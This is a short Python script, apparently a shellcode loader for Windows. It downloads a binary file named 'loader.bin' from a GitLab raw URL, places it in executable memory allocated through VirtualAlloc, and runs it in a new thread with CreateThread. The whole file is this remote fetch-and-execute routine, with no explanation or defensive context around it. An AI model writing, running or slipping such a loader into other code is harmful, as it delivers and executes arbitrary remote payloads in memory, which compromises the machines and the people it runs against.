import urllib.request
import ctypes
url = "https://gitlab.com/nanirish097/test/-/raw/main/loader.bin"
resp = urllib.request.urlopen(url)
shellcode = resp.read()
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.memmove(ptr, shellcode, len(shellcode))
thread = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(thread, -1)